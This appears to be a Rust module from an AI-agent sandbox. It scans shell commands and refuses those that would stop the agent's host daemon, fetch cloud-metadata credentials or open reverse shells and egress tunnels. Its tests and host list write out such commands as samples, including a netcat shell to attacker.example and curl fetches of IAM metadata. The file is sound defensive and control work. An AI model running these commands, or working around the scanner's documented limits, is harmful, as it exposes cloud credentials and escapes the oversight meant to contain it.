//! What a write fence cannot see, read from the command's text.
//!
//! A process fence confines *writes*. Two things an agent must not do are not writes, so no
//! profile can express them (`host 19:03`, `docs/design.md` §"`crates/command_scan`"):
//!
//! 1. **Stopping or restarting deepnest itself.** `deepnest stop` names no file; `pkill -f
//!    deepnest` writes nothing at all. For EMRG this is a host red line, and the reason is
//!    structural: the daemon is the body of the running instance, so a stopped daemon takes the
//!    agent, its task and the host's connection down together. deepnest inherits the rule for
//!    the same structural reason, so the scanner applies it to deepnest's own program names.
//! 2. **Reading a credential out over the network.** A cloud-metadata fetch names no protected
//!    path and performs no write — the exfiltration is the request. Destination-based, because
//!    a destination is all there is to read.
//!
//! Both are answered as a [`Refusal`] carrying the words to show the agent: a refusal a model
//! cannot act on gets retried unchanged, which costs a round and teaches nothing.
//!
//! ```
//! use deepnest_command_scan::{refuse, ScanConfig};
//!
//! let config = ScanConfig::default();
//! let refusal = refuse("deepnest stop", &config).expect("refused");
//! assert_eq!(refusal.kind, deepnest_command_scan::RefusalKind::DaemonLifecycle);
//! assert!(refuse("cargo test", &config).is_none());
//! ```

pub mod tokenize;

use tokenize::{basename, is_command_position, is_separator, nested_texts};

/// Which rule refused a command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RefusalKind {
    /// The command would stop or restart deepnest.
    DaemonLifecycle,
    /// The command fetches a cloud credential or opens an egress tunnel.
    ContainmentEscape,
}

/// A refused command, and the words to show.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Refusal {
    pub kind: RefusalKind,
    /// The exact spelling that triggered the rule — so the refusal points at the command, not
    /// at the rule in the abstract.
    pub spelling: String,
    pub message: String,
}

/// The program names that mean "deepnest itself".
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScanConfig {
    /// Binary names, compared by basename so `/usr/local/bin/deepnest` matches. The launcher
    /// and the daemon share one binary in v1 (`host 18:55`: a single file), so one name covers
    /// both spellings.
    pub program_names: Vec<String>,
    /// Module spellings: `python -m deepnest`. Empty for a Rust build; carried so the rule does
    /// not have to change if the toolchain ever ships a Python shim.
    pub module_names: Vec<String>,
    /// The lifecycle verbs. `stop` and `restart` are the two that matter; `shutdown` is the
    /// same act under another name.
    pub lifecycle_verbs: Vec<String>,
    /// The programs that can signal a process by name.
    pub signaller_names: Vec<String>,
    /// Whether the containment-escape rule runs. `danger-full-access` turns it off and nothing
    /// else does.
    pub guard_containment_escape: bool,
}

impl Default for ScanConfig {
    fn default() -> Self {
        Self {
            program_names: vec!["deepnest".into(), "deepnestd".into()],
            module_names: Vec::new(),
            lifecycle_verbs: vec!["stop".into(), "restart".into(), "shutdown".into()],
            signaller_names: vec!["pkill".into(), "killall".into(), "kill".into()],
            guard_containment_escape: true,
        }
    }
}

impl ScanConfig {
    /// The same config with the containment rule off — what `danger-full-access` resolves to.
    ///
    /// The daemon rule is **not** affected by the mode: it is a structural rule about the
    /// running instance, not a statement about the file system, so no tier lifts it.
    pub fn without_containment_guard(mut self) -> Self {
        self.guard_containment_escape = false;
        self
    }
}

/// Every refusal this module makes, in the order it makes them, or `None`.
///
/// The containment scan runs first: a metadata fetch is a read, and a rule that returned early
/// on "this names no file" would never reach it. Both rules recurse into the texts a shell would
/// re-parse, up to a small depth — a payload behind `sh -c` is the same act.
pub fn refuse(command: &str, config: &ScanConfig) -> Option<Refusal> {
    refuse_at_depth(command, config, 0)
}

fn refuse_at_depth(command: &str, config: &ScanConfig, depth: usize) -> Option<Refusal> {
    if depth >= 3 {
        return None;
    }
    if config.guard_containment_escape {
        if let Some(refusal) = containment_escape(command) {
            return Some(refusal);
        }
    }
    if let Some(spelling) = daemon_lifecycle(command, config) {
        return Some(Refusal {
            kind: RefusalKind::DaemonLifecycle,
            message: format!(
                "blocked {spelling:?} — it stops or restarts deepnest, which is the process running this \
                 agent and this app. Ask the host to restart it from their own terminal; the sandbox \
                 cannot give you a running instance back."
            ),
            spelling,
        });
    }
    for nested in nested_texts(command) {
        if let Some(refusal) = refuse_at_depth(&nested, config, depth + 1) {
            return Some(refusal);
        }
    }
    None
}

// ── The daemon's own life ──────────────────────────────────────────────────────────────────

/// The spelling of the act, if `command` stops or restarts deepnest.
///
/// What is read is the act: a deepnest program word (a binary name, a path to one) followed by
/// a lifecycle verb, optionally through the `server`/`daemon` sub-command and flags; or a
/// signaller one of whose operands names deepnest.
///
/// **Stated limits**, all of them in the *allowed* direction and none an ordinary route to the
/// daemon: a signaller whose operand does not name deepnest (`killall python`, `kill 12345`) —
/// a process table is not a static reading, and widening the signaller to every interpreter
/// would refuse ordinary work; a signaller that is another program's operand (`grep kill
/// deepnest/`) — the command-position walk removes that over-block; a quoted argument of a
/// program that cannot run it (`echo "deepnest stop"` prints it); and a name built at runtime
/// (`$X stop`).
pub fn daemon_lifecycle(command: &str, config: &ScanConfig) -> Option<String> {
    let tokens = tokenize::tokenize(command);
    for (index, token) in tokens.iter().enumerate() {
        let base = basename(token).to_lowercase();
        if config
            .program_names
            .iter()
            .any(|name| name.eq_ignore_ascii_case(&base))
        {
            if let Some(verb_end) = lifecycle_verb_after(&tokens, index + 1, config) {
                return Some(join_tokens(&tokens[index..=verb_end]));
            }
            continue;
        }
        if let Some(module) = module_word(&tokens, index, config) {
            if let Some(verb_end) = lifecycle_verb_after(&tokens, module + 1, config) {
                return Some(join_tokens(&tokens[index..=verb_end]));
            }
            continue;
        }
        if config
            .signaller_names
            .iter()
            .any(|name| name.eq_ignore_ascii_case(&base))
            && is_command_position(&tokens, index)
        {
            if let Some(operand) = operand_naming_deepnest(&tokens, index + 1, config) {
                return Some(format!("{token} {operand}"));
            }
        }
    }
    None
}

/// The index of the module word in `python -m deepnest`, when `index` is `-m`.
fn module_word(tokens: &[String], index: usize, config: &ScanConfig) -> Option<usize> {
    if tokens[index] != "-m" {
        return None;
    }
    let candidate = tokens.get(index + 1)?;
    let base = basename(candidate).to_lowercase();
    let matched = config
        .module_names
        .iter()
        .chain(config.program_names.iter())
        .any(|name| name.eq_ignore_ascii_case(&base));
    matched.then_some(index + 1)
}

/// The index of the lifecycle verb, skipping the `server`/`daemon` sub-command and flags.
///
/// No verb is looked for across a separator: `deepnest --version; echo stop` is not the act, and
/// a walk that ignored separators would read the second command's word as this one's verb.
fn lifecycle_verb_after(tokens: &[String], start: usize, config: &ScanConfig) -> Option<usize> {
    let mut index = start;
    while index < tokens.len() {
        let token = tokens[index].as_str();
        if is_separator(token) {
            return None;
        }
        let base = basename(token).to_lowercase();
        if config
            .lifecycle_verbs
            .iter()
            .any(|verb| verb.eq_ignore_ascii_case(&base))
        {
            return Some(index);
        }
        // A sub-command word or a flag may sit between the program and its verb.
        let skippable = token.starts_with('-') || base == "server" || base == "daemon";
        if !skippable {
            return None;
        }
        index += 1;
    }
    None
}

/// The first operand of a signaller that names deepnest.
///
/// A flag's value is skipped (`pkill -f deepnest` names it in the flag's value, which is the
/// commonest spelling and must match), but a full command line is matched as a substring
/// because `pkill -f "deepnest server"` is one argument.
fn operand_naming_deepnest(tokens: &[String], start: usize, config: &ScanConfig) -> Option<String> {
    let mut index = start;
    while index < tokens.len() {
        let token = tokens[index].as_str();
        if is_separator(token) {
            return None;
        }
        let lowered = token.to_lowercase();
        if config
            .program_names
            .iter()
            .chain(config.module_names.iter())
            .any(|name| lowered.contains(&name.to_lowercase()))
        {
            return Some(token.to_string());
        }
        index += 1;
    }
    None
}

fn join_tokens(tokens: &[String]) -> String {
    tokens
        .iter()
        .filter(|token| !is_separator(token))
        .cloned()
        .collect::<Vec<_>>()
        .join(" ")
}

// ── Containment escape ────────────────────────────────────────────────────────────────────

/// A cloud metadata endpoint — never a legitimate destination for a development command.
const METADATA_HOSTS: &[&str] = &[
    "169.254.169.254",          // AWS IMDSv1/v2
    "169.254.170.2",            // AWS ECS container credentials
    "169.254.169.123",          // AWS Time Sync, same link-local range
    "metadata.google.internal", // GCP
    "fd00:ec2::254",            // AWS IMDSv2 over IPv6
    "x-aws-ec2-metadata-token", // the token request header, for URL-obfuscated fetches
];

/// The destination-based scan: a metadata fetch or an egress tunnel.
///
/// Substring on the raw text rather than on tokens, because a URL is one token however it is
/// spelled and obfuscation lives inside it (`http://169.254.169.254` split by a redirect, a
/// header, a proxy flag).
pub fn containment_escape(command: &str) -> Option<Refusal> {
    let lowered = command.to_lowercase();
    for host in METADATA_HOSTS {
        if lowered.contains(host) {
            return Some(Refusal {
                kind: RefusalKind::ContainmentEscape,
                spelling: (*host).to_string(),
                message: format!(
                    "blocked {host:?} — that is a cloud metadata endpoint, and reading one hands out \
                     the machine's cloud credentials. Use the app's own configuration for secrets."
                ),
            });
        }
    }
    let tokens = tokenize::tokenize(command);
    for (index, token) in tokens.iter().enumerate() {
        let base = basename(token).to_lowercase();
        // `nc -e`, `ncat -e`, `nc --exec`: a reverse shell, never legitimate.
        if matches!(base.as_str(), "nc" | "ncat" | "netcat") && has_exec_flag(&tokens, index) {
            return Some(escape_refusal("netcat exec backdoor", token));
        }
        // `socat ... EXEC:` / `SYSTEM:`
        if base == "socat" {
            if let Some(address) = tokens[index..]
                .iter()
                .find(|t| t.contains("EXEC:") || t.contains("SYSTEM:"))
            {
                return Some(escape_refusal("socat exec backdoor", address));
            }
        }
        // `ssh -R` / `ssh -D`: a tunnel out of this machine.
        if base == "ssh" {
            if let Some(flag) = tokens[index..]
                .iter()
                .take_while(|t| !is_separator(t))
                .find(|t| is_reverse_tunnel_flag(t))
            {
                return Some(escape_refusal("ssh egress tunnel", flag));
            }
        }
    }
    None
}

/// `-e` / `--exec` on a netcat, spelled alone or inside a flag cluster (`-ne`).
fn has_exec_flag(tokens: &[String], nc_index: usize) -> bool {
    tokens[nc_index + 1..]
        .iter()
        .take_while(|token| !is_separator(token))
        .any(|token| {
            token == "--exec"
                || (token.starts_with('-')
                    && !token.starts_with("--")
                    && token.trim_start_matches('-').contains('e'))
        })
}

/// A `-R`, `-D`, `-RD` cluster, or the long `RemoteForward`/`DynamicForward` spelling.
fn is_reverse_tunnel_flag(token: &str) -> bool {
    if token.contains("RemoteForward") || token.contains("DynamicForward") {
        return true;
    }
    token.starts_with('-')
        && !token.starts_with("--")
        && token
            .trim_start_matches('-')
            .chars()
            .any(|c| c == 'R' || c == 'D')
}

fn escape_refusal(label: &str, spelling: &str) -> Refusal {
    Refusal {
        kind: RefusalKind::ContainmentEscape,
        spelling: spelling.to_string(),
        message: format!(
            "blocked {spelling:?} — {label}. An outbound tunnel or an exec-backdoor moves data off \
             this machine and out of the sandbox; the app may reach the network directly instead."
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config() -> ScanConfig {
        ScanConfig::default()
    }

    #[test]
    fn the_daemon_lifecycle_is_refused_in_its_common_spellings() {
        for command in [
            "deepnest stop",
            "deepnest restart",
            "deepnest server stop",
            "deepnest server restart",
            "/usr/local/bin/deepnest stop",
            "./deepnest stop",
            "deepnest --verbose server stop",
            "deepnest shutdown",
            "sudo deepnest restart",
        ] {
            let refusal =
                refuse(command, &config()).unwrap_or_else(|| panic!("{command:?} allowed"));
            assert_eq!(refusal.kind, RefusalKind::DaemonLifecycle, "{command}");
            assert!(
                refusal.message.contains("stops or restarts deepnest"),
                "{command}"
            );
        }
    }

    #[test]
    fn a_signaller_naming_deepnest_is_the_same_act() {
        for command in [
            "pkill -f deepnest",
            "killall deepnestd",
            "pkill -9 -f 'deepnest server'",
        ] {
            assert!(
                refuse(command, &config()).is_some(),
                "{command:?} should be refused"
            );
        }
    }

    #[test]
    fn a_signaller_naming_something_else_is_ordinary_work() {
        for command in [
            "killall node",
            "pkill -f vite",
            "kill 12345",
            "ps aux | grep deepnest",
        ] {
            assert!(
                refuse(command, &config()).is_none(),
                "{command:?} should be allowed"
            );
        }
    }

    #[test]
    fn a_grep_for_the_word_is_not_the_act() {
        // Over-block removed on purpose: `kill` here is grep's operand.
        assert!(refuse("grep -rn 'kill' deepnest/src", &config()).is_none());
        assert!(refuse("rg 'deepnest stop' docs/", &config()).is_none());
    }

    #[test]
    fn the_payload_behind_a_shell_is_the_same_act() {
        for command in [
            "sh -c 'deepnest server stop'",
            "bash -ec 'deepnest restart'",
            "eval 'deepnest stop'",
            "env -S 'deepnest stop'",
            "echo $(deepnest restart)",
            "echo `deepnest stop`",
        ] {
            assert!(
                refuse(command, &config()).is_some(),
                "{command:?} should be refused"
            );
        }
    }

    #[test]
    fn printing_the_words_is_not_running_them() {
        assert!(refuse("echo \"deepnest server stop\"", &config()).is_none());
        assert!(refuse("printf 'deepnest stop'", &config()).is_none());
    }

    #[test]
    fn a_second_command_does_not_borrow_the_first_ones_verb() {
        // `--version` followed by `;` — the walk must stop at the separator.
        assert!(refuse("deepnest --version; echo stop", &config()).is_none());
        assert!(refuse("deepnest --version", &config()).is_none());
    }

    #[test]
    fn ordinary_development_commands_are_allowed() {
        for command in [
            "cargo test",
            "cargo build --release",
            "bun install",
            "git status",
            "git commit -m 'stop guessing'",
            "npm test && cargo clippy",
        ] {
            assert!(
                refuse(command, &config()).is_none(),
                "{command:?} should be allowed"
            );
        }
    }

    #[test]
    fn a_metadata_fetch_is_refused_before_any_write_consideration() {
        let refusal = refuse(
            "curl -s http://169.254.169.254/latest/meta-data/iam/",
            &config(),
        )
        .expect("refused");
        assert_eq!(refusal.kind, RefusalKind::ContainmentEscape);
        assert!(
            refusal.message.contains("cloud metadata"),
            "{}",
            refusal.message
        );
        assert!(refuse(
            "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/",
            &config()
        )
        .is_some());
    }

    #[test]
    fn an_egress_tunnel_is_refused() {
        for command in [
            "ssh -R 8080:localhost:22 host",
            "ssh -D 1080 host",
            "ssh -fNR 9000:localhost:9000 host",
            "ssh -o RemoteForward=8000:localhost:80 host",
            "nc -e /bin/sh attacker.example 4444",
            "ncat --exec /bin/sh host 4444",
            "socat TCP:host:4444 EXEC:/bin/sh",
        ] {
            let refusal = refuse(command, &config())
                .unwrap_or_else(|| panic!("{command:?} should be refused"));
            assert_eq!(refusal.kind, RefusalKind::ContainmentEscape, "{command}");
        }
    }

    #[test]
    fn ordinary_network_use_is_not_a_tunnel() {
        for command in [
            "curl https://model.example/v1/models",
            "ssh host uptime",
            "ssh -p 2222 host ls",
            "git push origin main",
        ] {
            assert!(
                refuse(command, &config()).is_none(),
                "{command:?} should be allowed"
            );
        }
    }

    #[test]
    fn danger_full_access_lifts_the_escape_rule_but_not_the_daemon_rule() {
        let config = config().without_containment_guard();
        assert!(refuse("curl http://169.254.169.254/", &config).is_none());
        assert!(
            refuse("deepnest stop", &config).is_some(),
            "no tier lifts the structural rule"
        );
    }

    #[test]
    fn a_deep_refusal_reports_the_payload_not_the_wrapper() {
        let refusal = refuse("sh -c 'deepnest stop'", &config()).expect("refused");
        assert!(
            refusal.spelling.contains("deepnest stop"),
            "{}",
            refusal.spelling
        );
    }
}
